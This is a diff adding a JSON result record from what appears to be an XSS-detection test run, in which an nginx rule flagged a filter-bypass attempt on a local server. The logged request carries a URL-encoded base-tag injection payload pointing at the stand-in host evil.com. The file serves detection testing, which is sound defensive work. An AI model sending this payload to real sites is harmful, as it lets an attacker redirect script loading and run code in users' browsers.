@@ -1,0 +1,17 @@
+{
+  "pattern_id": "XSS_CSP_001",
+  "test_id": "XSS_CSP_001-1772192194170-8xcrl8",
+  "category": "xss",
+  "detected": true,
+  "expected_detection": true,
+  "latency_ms": 43000,
+  "evidence": "11:36:34.000000000: Warning [NGINX XSS] XSS Filter Bypass Attempt test_id=XSS_CSP_001-1772192194170-8xcrl8 pattern_id=XSS_CSP_001 uri=/?q=%3Cbase%20href%3D%22https%3A%2F%2Fevil.com%2F%22%3E client=127.0.0.1 method=GET",
+  "rule_name": "[NGINX XSS] XSS Filter Bypass Attempt test_id=XSS_CSP_001-1772192194170-8xcrl8 pattern_id=XSS_CSP_001 uri=/?q=%3Cbase%20href%3D%22https%3A%2F%2Fevil.com%2F%22%3E client=127.0.0.1 method=GET",
+  "expected_rule": "[NGINX XSS] XSS Filter Bypass Attempt",
+  "rule_id": "",
+  "rule_match": true,
+  "matched_rule": "[NGINX XSS] XSS Filter Bypass Attempt test_id=XSS_CSP_001-1772192194170-8xcrl8 pattern_id=XSS_CSP_001 uri=/?q=%3Cbase%20href%3D%22https%3A%2F%2Fevil.com%2F%22%3E client=127.0.0.1 method=GET",
+  "sent_at": 1772192237000,
+  "detected_at": 1772192194000,
+  "status": "passed"
+}
